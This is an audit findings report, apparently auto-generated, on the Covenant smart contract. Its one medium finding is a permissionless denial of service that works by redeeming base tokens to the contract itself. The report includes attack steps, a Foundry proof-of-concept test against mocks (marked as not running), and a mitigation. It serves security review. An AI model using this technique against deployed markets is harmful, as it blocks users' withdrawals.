# 2025 10 covenant - Findings Report
## Commit hash: d5ebe4461564b46cacf8a90cf11add29470ef001

##Findings by Pattern


 **Derived From** : Let bs0 = marketState[redeemParams.marketId].baseSupply, fee0 = marketState[redeemParams.marketId].protocolFeeGrowth, bal0 = IERC20(redeemParams.marketParams.baseToken).balanceOf(address(this)) before call; let amt = return(baseAmountOut) after success: (bs0 - marketState[redeemParams.marketId].baseSupply) == amt + (marketState[redeemParams.marketId].protocolFeeGrowth - fee0) AND bal0 - IERC20(redeemParams.marketParams.baseToken).balanceOf(address(this)) == amt

[M-1]. Redeem to Covenant itself drains baseSupply without moving tokens, breaking balance invariant and enabling market-wide DoS
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless
Poc Test Status: ErrorRunningTests



### Number of Findings
- C: 0
- H: 0
- M: 1
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : Let bs0 = marketState[redeemParams.marketId].baseSupply, fee0 = marketState[redeemParams.marketId].protocolFeeGrowth, bal0 = IERC20(redeemParams.marketParams.baseToken).balanceOf(address(this)) before call; let amt = return(baseAmountOut) after success: (bs0 - marketState[redeemParams.marketId].baseSupply) == amt + (marketState[redeemParams.marketId].protocolFeeGrowth - fee0) AND bal0 - IERC20(redeemParams.marketParams.baseToken).balanceOf(address(this)) == amt

## [M-1]. Redeem to Covenant itself drains baseSupply without moving tokens, breaking balance invariant and enabling market-wide DoS

## Derived From Pattern/Invariant
Let bs0 = marketState[redeemParams.marketId].baseSupply, fee0 = marketState[redeemParams.marketId].protocolFeeGrowth, bal0 = IERC20(redeemParams.marketParams.baseToken).balanceOf(address(this)) before call; let amt = return(baseAmountOut) after success: (bs0 - marketState[redeemParams.marketId].baseSupply) == amt + (marketState[redeemParams.marketId].protocolFeeGrowth - fee0) AND bal0 - IERC20(redeemParams.marketParams.baseToken).balanceOf(address(this)) == amt

## Exploit Type
AccountingInvariantViolation

## Location
Covenant.redeem

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Covenant.redeem updates baseSupply by subtracting amountOut and protocolFees, then transfers base tokens to redeemParams.to. If redeemParams.to == address(this), ERC20 transfer is a self-transfer (from == to) and leaves the contract’s base token balance unchanged, while baseSupply is still debited. This violates the Balance invariant that the ERC20 balance must decrease by the redeemed amount, and lets any user brick the market by repeatedly redeeming to the Covenant contract to drive baseSupply to zero while tokens remain in the contract, causing subsequent base redemptions/swaps to revert due to baseSupply checks.

Vulnerable snippet:

function redeem(...) {
  ...
  ms.baseSupply = localBaseSupply - amountOut - protocolFees;
  if (protocolFees > 0) ms.protocolFeeGrowth += protocolFees;
  IERC20(mp.baseToken).safeTransfer(redeemParams.to, amountOut); // to can be address(this)
}

Because OZ ERC20 allows self-transfers that net to no balance change, the accounting is decoupled from the real ERC20 balance, enabling a permissionless DoS.

## Impact
A user can set redeemParams.to = address(this) (or swap with assetOut = BASE and to = address(this)) to debit marketState.baseSupply without reducing the contract’s actual ERC20 base token balance, breaking the accounting invariant baseSupply ≈ on-chain balance minus protocol fees. A griefing attacker can mint, then redeem-to-self to drive baseSupply to zero while the base tokens remain held by the Covenant contract, making all subsequent base-out redemptions and swaps revert due to ValidationLogic baseSupply checks. This causes a permissionless, indefinite DoS of withdrawals for that market until new deposits raise baseSupply again. No direct theft occurs, but availability of user withdrawals is impacted and the attacker can brick a market by sacrificing their own funds.

## Command to Run Test


## Proof of Concept
High-level steps:
1) Attacker creates or targets an existing market with non-zero baseSupply.
2) Attacker mints base into the market (legit flow), increasing baseSupply and transferring base tokens into Covenant.
3) Attacker calls redeem with to = address(Covenant). LEX returns a positive amountOut based on the a/z being burned. Covenant updates ms.baseSupply -= amountOut but performs a self-transfer of baseToken (contract → contract), so the ERC20 balance remains unchanged.
4) Repeating step 3 (or doing it with an amount equal to current baseSupply) drives ms.baseSupply toward zero while the actual ERC20 balance stays high.
5) Any subsequent base-out operations (redeem or swap with assetOut = BASE) now revert due to baseSupply checks, despite the contract still holding base tokens. The market is bricked until someone mints again to raise baseSupply.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {Covenant} from "src/Covenant.sol";
import {ICovenant, MarketId, MarketParams, MintParams, RedeemParams, SwapParams} from "src/interfaces/ICovenant.sol";
import {ILiquidExchangeModel} from "src/interfaces/ILiquidExchangeModel.sol";
import {Errors} from "src/libraries/Errors.sol";
import {ERC20} from "@openzeppelin/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Base", "BASE") {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

// Realistic-enough LEX mock: outputs proportional to inputs and capped by baseSupply
contract MockLEX is ILiquidExchangeModel {
    string public constant name = "MockLEX";

    function getProtocolFee(MarketId) external pure returns (uint32) { return 0; }
    function getSynthTokens(MarketId) external pure returns (SynthTokens memory s) { return s; }
    function setMarketProtocolFee(MarketId, uint32) external {}

    function initMarket(
        MarketId,
        MarketParams calldata,
        uint32,
        bytes memory
    ) external pure returns (SynthTokens memory s, bytes memory d) { return (s, ""); }

    // Mint returns aTokens ~= baseAmountIn (z=0) to give the caller enough to redeem later.
    function mint(
        MintParams calldata mintParams,
        address /*sender*/,
        uint256 /*baseSupply*/
    ) external payable returns (uint256 aOut, uint256 zOut, uint128 fee, TokenPrices memory p) {
        aOut = mintParams.baseAmountIn; zOut = 0; fee = 0; p = TokenPrices(0,0,0);
    }

    // Redeem returns amountOut = min(aIn+zIn, baseTokenSupply). Fees = 0
    function redeem(
        RedeemParams calldata redeemParams,
        address /*sender*/,
        uint256 baseTokenSupply
    ) external payable returns (uint256 amtOut, uint128 fee, TokenPrices memory p) {
        uint256 inSum = redeemParams.aTokenAmountIn + redeemParams.zTokenAmountIn;
        amtOut = inSum > baseTokenSupply ? baseTokenSupply : inSum;
        fee = 0; p = TokenPrices(0,0,0);
    }

    function swap(
        SwapParams calldata swapParams,
        address /*sender*/,
        uint256 /*baseSupply*/
    ) external payable returns (uint256 amtCalc, uint128 fee, TokenPrices memory p) {
        amtCalc = swapParams.amountSpecified; fee = 0; p = TokenPrices(0,0,0);
    }

    function updateState(
        MarketId /*marketId*/,
        MarketParams calldata /*marketParams*/,
        uint256 /*baseTokenSupply*/,
        bytes calldata /*data*/
    ) external payable returns (uint128) { return 0; }

    function quoteMint(MintParams calldata mintParams, address, uint256) external pure returns (uint256, uint256, uint128, uint128, TokenPrices memory) {
        return (mintParams.baseAmountIn, 0, 0, 0, TokenPrices(0,0,0));
    }
    function quoteRedeem(RedeemParams calldata redeemParams, address, uint256 baseTokenSupply) external pure returns (uint256, uint128, uint128, TokenPrices memory) {
        uint256 inSum = redeemParams.aTokenAmountIn + redeemParams.zTokenAmountIn;
        uint256 amtOut = inSum > baseTokenSupply ? baseTokenSupply : inSum;
        return (amtOut, 0, 0, TokenPrices(0,0,0));
    }
    function quoteSwap(SwapParams calldata swapParams, address, uint256) external pure returns (uint256, uint128, uint128, TokenPrices memory) {
        return (swapParams.amountSpecified, 0, 0, TokenPrices(0,0,0));
    }
}

contract RedeemToSelf_DoS_Test is Test {
    Covenant cov;
    MockERC20 base;
    MockLEX lex;
    address curator = address(0xCAFE);
    address attacker = address(0xBEEF);

    function setUp() public {
        cov = new Covenant(address(this));
        base = new MockERC20();
        lex = new MockLEX();
        cov.setEnabledLEX(address(lex), true);
        cov.setEnabledCurator(curator, true);
    }

    function _params() internal view returns (MarketParams memory p) {
        p.baseToken = address(base);
        p.quoteToken = address(0x1);
        p.curator = curator;
        p.lex = address(lex);
    }

    function test_redeem_to_self_breaks_invariant_and_dos() public {
        // Create market
        MarketParams memory mp = _params();
        MarketId mid = cov.createMarket(mp, "");

        // Seed attacker and approve
        base.mint(attacker, 100 ether);
        vm.startPrank(attacker);
        base.approve(address(cov), type(uint256).max);

        // Mint 100 base -> raises baseSupply and transfers tokens to Covenant
        MintParams memory m;
        m.marketId = mid; m.marketParams = mp; m.baseAmountIn = 100 ether; m.to = attacker;
        m.minATokenAmountOut = 0; m.minZTokenAmountOut = 0; m.data = ""; m.msgValue = 0;
        cov.mint(m);
        vm.stopPrank();

        // Snapshot
        uint256 bs0 = cov.getMarketState(mid).baseSupply;
        uint256 bal0 = base.balanceOf(address(cov));
        assertEq(bal0, 100 ether, "ERC20 balance after mint");
        assertEq(bs0, 100 ether, "baseSupply after mint");

        // Attacker redeems full minted aTokens to Covenant itself (self-transfer)
        vm.startPrank(attacker);
        RedeemParams memory r;
        r.marketId = mid; r.marketParams = mp; r.aTokenAmountIn = 100 ether; r.zTokenAmountIn = 0;
        r.to = address(cov); r.minAmountOut = 0; r.data = ""; r.msgValue = 0;
        uint256 amt = cov.redeem(r);
        vm.stopPrank();

        // Post: baseSupply debited by amt, ERC20 balance unchanged (self-transfer)
        uint256 bs1 = cov.getMarketState(mid).baseSupply;
        uint256 bal1 = base.balanceOf(address(cov));
        assertEq(amt, 100 ether, "redeem amountOut");
        assertEq(bs0 - bs1, amt, "baseSupply debited by amt");
        assertEq(bal0, bal1, "ERC20 balance unchanged due to self-transfer");
        assertEq(bs1, 0, "baseSupply drained to zero");

        // DoS: subsequent base-out redemption reverts (amountOut == 0)
        vm.startPrank(attacker);
        r.aTokenAmountIn = 1; // any positive input now results in 0 out
        vm.expectRevert(Errors.E_InsufficientAmount.selector);
        cov.redeem(r);
        vm.stopPrank();
    }
}


## Suggested Mitigation
Prevent self-transfers of base tokens: in Covenant.redeem require(redeemParams.to != address(this)); and in Covenant.swap require(swapParams.assetOut != AssetType.BASE || swapParams.to != address(this)); This ensures ms.baseSupply debits always correspond to an actual decrease of the contract’s ERC20 balance. Optionally, enforce the invariant by checking the delta of IERC20(base).balanceOf(address(this)) before/after the transfer equals amountOut (and revert on mismatch). If fee-on-transfer tokens must be supported, document them explicitly and adjust accounting to use measured deltas instead of assumed amounts.



